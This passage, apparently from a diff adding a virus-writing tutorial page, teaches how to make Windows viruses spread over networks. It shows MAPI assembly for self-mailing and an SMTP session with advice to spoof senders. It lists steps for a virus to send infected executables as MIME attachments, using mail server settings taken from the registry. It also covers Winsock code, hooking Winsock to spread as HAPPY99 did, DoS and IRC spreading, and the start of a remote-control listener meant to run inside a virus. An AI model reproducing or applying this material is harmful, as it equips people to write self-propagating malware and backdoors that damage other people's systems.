+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;ulEIDSize</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpEntryID</span><br/>
+<br/>
+MsgTo &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;ulReserved </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;ulRecipClass</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszName</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszAddress</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;ulEIDSize</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpEntryID</span><br/>
+<br/>
+MapiFileDesc&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;ulReserved</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;flFlags</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;nPosition</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszPathName</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpszFileName</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00000000h</span> <span style="color: black; font-style: italic;">;lpFileType</span><br/>
+<br/>
+_DATA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ends<br/>
+<br/>
+_BSS&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">segment</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: #0000ff; font-weight: bold;">use32</span> <span style="color: #0000ff; font-weight: bold;">public</span> <span style="color: #7f007f;">'BSS'</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;Playing with MAPI32.DLL&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;BioCoded by Maia&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+_BSS&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ends<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; end demo_entry<br/>
+&nbsp;</div>
+<p>As you can see using MAPI is not very difficult at all, nothing compared with writing your own SMTP engine. If you choose to write your own SMTP engine you will need to code routines to encode de attached files and to handle attachments.</p>
+<h3><a name="p33">Electronic mail propagation using our own SMTP engine</a></h3>
+<p>Did you ever sent a mail using TELNET? Just type:</p>
+<pre class="source">
+ 		TELNET smtp.server.com 25
+</pre>
+<p>Use the name of a mail server you know or you normaly use. You should recive an answer like:</p>
+<pre class="source">
+		Connecting to smtp.server.com...
+		Trying x.x.x.x ... connected.
+		220 smtp.server.com Sendmail 6.66 ready at Sun, 4 June 1999
+</pre>
+<p>Remember to press ENTER after each command. Wait for connection and after reciving the answer type:</p>
+<pre class="source">
+		HELO servername.com
+</pre>
+<p>Then you will recive an answer like:</p>
+<pre class="source">
+		250 smtp.server.com Hello your.host.com, pleased to meet you
+</pre>
+<p>Now type:</p>
+<pre class="source">
+		MAIL FROM: &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3f5246515e525a7f4c5a4d495a4d515e525a115c5052">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>
+</pre>
+<p>This is where the message comes from. You can spoof this address using the username/server you want. Some Win32.Parvo generated email's look's like comming from Microsoft, for instance. Wait for response, it will look like:</p>
+<pre class="source">
+		250 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e5889c8b848880a59680979380978b848880cb868a88">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>... Sender ok
+</pre>
+<p>And now type:</p>
+<pre class="source">
+		RCPT TO: &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e2918d8f878d8c87a2918d8f87918790948790cc818d8f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>
+</pre>
+<p>This last command tells the destination address for the mail. You should recive now this answer:</p>
+<pre class="source">
+		250 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b8cbd7d5ddd7d6ddf8cbd7d5ddcbddcaceddca96dbd7d5">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>... Recipient ok
+</pre>
+<p>Type:</p>
+<pre class="source">
+		DATA
+</pre>
+<p>The server replies:</p>
+<pre class="source">
+		354 Enter mail, end with "." on a line by itself
+</pre>
+<p>Now you can enter the mail body, type the following without waiting for response:</p>
+<pre class="source">
+		FROM: myname &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a9c4d0c7c8c4cce9daccdbdfccdbc7c8c4cc87cac6c4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>
+		TO: someone &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="186b77757d77767d586b77757d77767d367b7775">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>
+		SUBJECT: just playing with smtp
+
+		hello!
+
+		.
+</pre>
+<p>Note that the last command is a "." by itself. The mail is generated, type:</p>
+<pre class="source">
+		QUIT
+</pre>
+<p>And the work is done. A self mailing virus using its own SMTP engine have to perform all the above mentioned tasks... The complete list follows:</p>
+<ul>
+<li>Check if there is network connection. If the virus calls network APIs without an existing connection a dialog box may appear. Would be funny if CALC.EXE shows a dial-up dialog box when executed. There are several APIs that may result interesting to do this, for instance: InternetGetConnectedState (which belongs to WININET.DLL) or even GetSystemMetrics (using SM_NETWORK as parameter).</li>
+<li>Connect to a SMTP server. You can insert some IP addresses for some mail servers inside the virus, but this servers have to allow relaying. A better approach is to take the server address from the registry. Look at the following keys: <tt>HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000001</tt> There is information like the SMTP server to use (key 'SMTP Server'), like the port to connect to (key 'SMTP Port') or even the user email address (key 'SMTP Email Address').
+<p>I think this keys are present only when Outlook Express is installed, but nowadays is difficult to find any Windows without it.</p></li>
+<li>Once connected the virus have to send the mail building messages described above (HELO, MAIL FROM, RCPT TO, etc..).</li>
+</ul>
+<p>But... What about attachments? The virus have to send an infected executable file. You can use MIME and BASE64. This is an example of a MIME multipart message:</p>
+<pre class="source">
+;--------------->8----------------------------------------------------------
+
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+boundary="----=_NextPart_000_0005_01BDE2FC.8B286C00"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Unsent: 1
+X-MimeOLE: Produced By Microsoft MimeOLE V4.72.3110.3
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0005_01BDE2EC.8B286C00
+Content-Type: text/plain; charset=iso-8859-1
+Content-Transfer-Encoding: quoted-printable
+
+This is the text message.
+
+------=_NextPart_000_0005_01BDE2EC.8B286C00
+Content-Type: application/octet-stream;	name=filename.exe
+Content-Transfer-Encoding: base64',0Ah
+Content-Disposition: attachment; filename="filename.exe"
+
+TVqQAAMAAAAEAAAA//...this is the BASE64 encoded file...
+
+;--------------->8----------------------------------------------------------
+</pre>
+<p>For more information on the SMTP protocol read RFC 821 [Postel 1982] and RFC 822 [Crocker 1982]. You can find how MIME works in RFC 1521 [Borenstein and Freed 1993].</p>
+<h2><a name="p4">WINSOCK</a></h2>
+<p>Before we have spoken of things as 'connect to the server' or 'send the message'. For this purpose we will use the functions provided by WSOCK32.DLL (socket, connect, send, recv...). There is no need to use Winsock if we are using MAPI (which deliver the messages for us).</p>
+<p>The following example was written in C++ and shows how to connect to an IRC server on port 6667:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Create IRC SERVER socket</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; m_AsyncSocket <span style="color: #339933;">=</span> new CAsyncSocket <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span> <span style="color: #339933;">!</span>m_AsyncSocket<span style="color: #339933;">-&gt;</span>Create<span style="color: black;">&#40;</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SOCK_STREAM<span style="color: #339933;">,</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FD_READ<span style="color: #339933;">|</span>FD_CONNECT<span style="color: #339933;">|</span>FD_CLOSE<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NULL<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; m_AsyncSocket<span style="color: #339933;">-&gt;</span>m_RichEditCtrl <span style="color: #339933;">=</span> m_RichEditCtrl <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Connect to IRC SERVER</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> sockaddr_in&nbsp; &nbsp; &nbsp; server <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> hostent&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>hp <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; addr <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> servername<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><span style="color: #339933;">=</span><span style="color: #ff0000;">&quot;aire.irc-hispano.org&quot;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Check if servername is a name or a ip address</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/isalpha.html"><span style="color: #000066;">isalpha</span></a> <span style="color: black;">&#40;</span> servername<span style="color: black;">&#91;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> hp <span style="color: #339933;">=</span> gethostbyname <span style="color: black;">&#40;</span> servername<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// IP address</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; addr <span style="color: #339933;">=</span> inet_addr<span style="color: black;">&#40;</span> servername<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hp <span style="color: #339933;">=</span> gethostbyaddr<span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>addr<span style="color: #339933;">,</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">,</span> AF_INET<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> hp <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m_AsyncSocket<span style="color: #339933;">-&gt;</span>Close<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> FALSE <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memset.html"><span style="color: #000066;">memset</span></a> <span style="color: black;">&#40;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>server<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span> <span style="color: black;">&#40;</span> server<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a> <span style="color: black;">&#40;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span><span style="color: black;">&#40;</span> server.<span style="color: #202020;">sin_addr</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> hp<span style="color: #339933;">-&gt;</span>h_addr<span style="color: #339933;">,</span> hp<span style="color: #339933;">-&gt;</span>h_length<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; server.<span style="color: #202020;">sin_family</span> <span style="color: #339933;">=</span> hp<span style="color: #339933;">-&gt;</span>h_addrtype <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; server.<span style="color: #202020;">sin_port</span> <span style="color: #339933;">=</span> htons <span style="color: black;">&#40;</span> <span style="color: #0000dd;">6667</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// IRC port</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span> <span style="color: #339933;">!</span>m_AsyncSocket<span style="color: #339933;">-&gt;</span>Connect<span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> <span style="color: #993333;">struct</span> sockaddr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>server<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span> sockaddr_in<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> WSAGetLastError<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> WSAEWOULDBLOCK<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m_AsyncSocket<span style="color: #339933;">-&gt;</span>Close<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Have a look at Win32.Parvo source code. Parvo uses Winsock to connect to a SMTP server and also implements is own SMTP, MIME and BASE64 engines, everything written in assembler.</p>
+<p>Other 'creative' ways of using sockets in a virus they can be:</p>
+<ul>
+<li>To open a listen port awaiting commands. These commands can instruct the virus to what to make in each moment (to send certain files, to extract passwords, to leave the system or even to destroy it).</li>
+<li>Denial of service. We have already seen some examples of this: A virus that creates connections to a certain FTP server leaves them open. If many infected users exist they could be overcome the maximum number of connections allowed by the server.</li>
+<li>IRC spreading, by connecting to well known ports on servers and using Internet Relay Chat Protocol, described at RFC 1459 [J. Oikarinen and D. Reed 1993].</li>
+<li>Do work as a bouncer, allowing connections on certain port and redirecting them to other host/port.</li>
+<li>In definitive, to make any thing on the net that we don't want to make from our own address.</li>
+</ul>
+<h2><a name="p5">Hooking networking APIs</a></h2>
+<p>A virus can hook Winsock connect API. When this hook recives control the virus can check the desired port, if its 25 (SMTP) its time to spread by mail using that server. This is how the worm HAPPY99 works, and works fine, but requires patching Winsock dll. This tech can be hard to implement without modifying Winsock on some way. The virus can hook Winsock APIs imported by the infected files, but this functions are ussually imported by ordinal or have been included inside a DLL that is loaded by the main executable. The solution is to hook LoadLibrary and GetProcAddress, in order to hook APIs imported by loaded DLLs. I think there arent better samples of this than Vecna's recent network-enabled viruses.</p>
+<p>But wait! This can be done not only for port 25. We can, for instance, monitor for port 21 (FTP) and try to create a virus dropper on the incomming directory of the server the user is connecting to. Even port 80 (HTTP) can gives us something to play with, again, let your imagination fly.</p>
+<h2><a name="p6">Remote control</a></h2>
+<p>To be able to control a virus in remote through a net seems a formidable idea.</p>
+<p>As example of this I present two simple programs written using Visual C++.</p>
+<p>The first of them acts as server, and its the part that we would have to include in a virus that will listened to us.</p>
+<p>The second it acts as client, and its the program that we would use to be able to communicate with the virus. Something like a remote control.</p>
+<p>The server program creates a socket and it remains awaiting your orders. When it receives a packet it just displays its contents on a messagebox.</p>
+<p>This example is very basic, but you could modify it easily. For example, you could code the content of the packages, so that they indicate different actions to carry out. If you recive a 00 could show a message, if you recive a 01 could turn off Windows, etc...</p>
+<p>This is the way in that programs like BackOrifice or NetBus works. Why not to apply it to a virus?. For instance, a virus that to a certain order left an infected system. Some may wonder why we could want to clean our virus in remote... A virus can be used to penetrate into a system, to carry out a certain mission and left this system... Cool, isnt it?</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<br/>
+<span style="color: black; font-style: italic;">//</span><br/>
+<span style="color: black; font-style: italic;">// SERVER.CPP</span><br/>
+<span style="color: black; font-style: italic;">//</span><br/>
+<br/>
+<span style="color: #339933;">#include &quot;stdafx.h&quot;</span><br/>
+<span style="color: #339933;">#include &amp;lt;windows.h&gt;</span><br/>
+<span style="color: #339933;">#include &amp;lt;winsock2.h&gt;</span><br/>
+<br/>
+<span style="color: #339933;">#define LISTEN_PORT 16384</span><br/>
+<br/>
+<span style="color: #993333;">int</span> main<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span><span style="color: #339933;">*</span> argv<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span>&nbsp; &nbsp; Buffer<span style="color: black;">&#91;</span> <span style="color: #0000dd;">128</span><span style="color: black;">&#93;</span> <span style="color: #339933;">;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; retval<span style="color: #339933;">,</span> fromlen<span style="color: #339933;">;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span>&nbsp; sockaddr_in local<span style="color: #339933;">,</span> from <span style="color: #339933;">;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; WSADATA wsaData <span style="color: #339933;">;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; SOCKET&nbsp; listen_socket <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> WSAStartup<span style="color: black;">&#40;</span> <span style="color: #208080;">0x202</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>wsaData<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> SOCKET_ERROR<span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WSACleanup<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; local.<span style="color: #202020;">sin_family</span> <span style="color: #339933;">=</span> AF_INET <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; local.<span style="color: #202020;">sin_addr</span>.<span style="color: #202020;">s_addr</span> <span style="color: #339933;">=</span> INADDR_ANY <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; local.<span style="color: #202020;">sin_port</span> <span style="color: #339933;">=</span> htons<span style="color: black;">&#40;</span> LISTEN_PORT<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
